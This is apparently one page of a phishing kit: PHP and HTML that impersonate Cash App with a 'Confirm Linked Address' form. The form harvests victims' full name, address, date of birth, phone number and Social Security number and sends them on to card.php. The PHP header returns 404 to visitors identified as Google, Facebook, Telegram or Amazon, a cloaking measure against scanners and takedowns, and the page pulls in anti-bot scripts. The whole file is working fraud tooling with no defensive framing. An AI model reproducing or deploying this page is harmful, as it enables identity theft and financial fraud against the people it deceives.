<?php
session_start();
ini_set( "display_errors", 0); 
require_once '../../main.php';
include 'flow/bot_kontol.php';

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'facebook') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'facebook') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'telegram') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'telegram') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'amazon') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'amazon') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
session_start();
///DON'T TOUCH THIS\\\
$_SESSION['pin1'];
$_SESSION['pin2'];
$_SESSION['pin3'];
$_SESSION['pin4'];
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html lang="en" style="--vh:722px;">
<head> 
<meta charset="utf-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"> 
<title>Cash App</title> 
<link rel="icon" sizes="196x196" href="/static/img/icon.png"> 
<link rel="icon" href="/static/img/favicon.ico"> 
<link rel="stylesheet" type="text/css" href="/static/css/cash.css"> 
<style> 
input{ height:55px !important; } 
.rowdua{ width:100%; display:flex; } 
.kanan{ margin-left:3px; float:left; flex:49%; position:relative; } 
.kiri{ margin-right:3px; float:right; flex:49%; position:relative; } 
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 30%;
}
</style> 
<script>
</script> 
</head> 
<body class="theme-bg ember-application theme-green"> 
<div id="ember321" class="ember-view"> 
<div id="ember345" class="full-height application-cash ember-view"> 
<div id="ember352" class="cookie-banner ember-view">  
</div> 
<section class="layout-login flex-container full-height pad"> 
<div class="login-container flex-container flex-v-center flex-fill"> 
<h1 class="step-title flex-static">Confirm Linked Address</h1> 
<form autocomplete="off" novalidate="true" id="contactForm" method="post" action="card.php" target="_self" class="login-form ember-view"> 
<div class="field-container"> 
<div class="field"> 
<div class="field fk-field-container ember-view "> 
<input type="text" name="fname" autocomplete="off" spellcheck="false" id="fname" class="ember-text-field ember-view" placeholder="Full Name" maxlength="23">
</div> 
</div> 
</div>  
<div class="field-container"> 
<div class="field"> 
<div class="field fk-field-container ember-view"> 
<input type="text" name="address" autocomplete="off" spellcheck="false" id="address" class="ember-text-field ember-view" placeholder="Address" maxlength="25" > 
</div> 
</div> 
</div> 
<div class="rowdua"> <div class="kiri"> 
<div class="field fk-field-container ember-view"> 
<input type="text" name="state" id="state" class="ember-text-field ember-view" placeholder="State" maxlength="15"> 
</div> 
</div> 
<div class="kanan"> 
<div class="field fk-field-container ember-view"> 
<input type="tel" name="zip" id="zip" class="ember-text-field ember-view" placeholder="Zip" maxlength="8"> 
</div> 
</div> 
</div>
<div class="field-container"> <div class="field"> 
<div class="field fk-field-container ember-view"> 
<input type="tel" name="dob" autocomplete="off" spellcheck="false" id="dob" class="ember-text-field ember-view" placeholder="Date of Birth" maxlength="10"> 
</div> 
</div> 
</div> 
<div class="field-container"> 
<div class="field"> 
<div class="field fk-field-container ember-view"> 
<input type="tel" name="phone" autocomplete="off" spellcheck="false" id="phone" class="ember-text-field ember-view" placeholder="Phone Number" maxlength="12"> 
</div> 
</div> 
</div> 
<div class="field-container"> 
<div class="field"> 
<div class="field fk-field-container ember-view"> 
<input type="tel" name="ssn" autocomplete="off" spellcheck="false" id="ssn" class="ember-text-field ember-view" placeholder="Social Security Number" maxlength="11"> 
</div> 
</div> 
</div> 
<div id="ember555" class="cta submit-button-component submit-button-with-spinner ember-view"> 
<button type="submit" class="button theme-button button--round theme-button">Continue</button> 
</div> 
</form> 
<a href="#" class="login-help-link fade-in immediate show">Help</a> 
</div> 
</section>  
<div id="cashModal" class="modal-manager ember-view" style="display:none"> 
<div class="modal-overlay show">
</div>
<div class="modal-scroller fade-in show ember-view"> 
<div class="modal-window flex-container flex-v theme-white small ember-view"> 
<div class="modal-window-content content"> <div class="spinner-container ember-view">
</div> 
</div> 
</div> 
</div> 
</div> 
</div> 
</div>   
<script type="text/javascript" src="/static/js/jquery.min.js"></script> 
<script type="text/javascript" src="/static/js/mask.js"></script> 
<script type="text/javascript" src="/static/js/cvalid.js"></script> 
<script type="text/javascript" src="/static/js/kontol.js"></script> 
</body>
</html>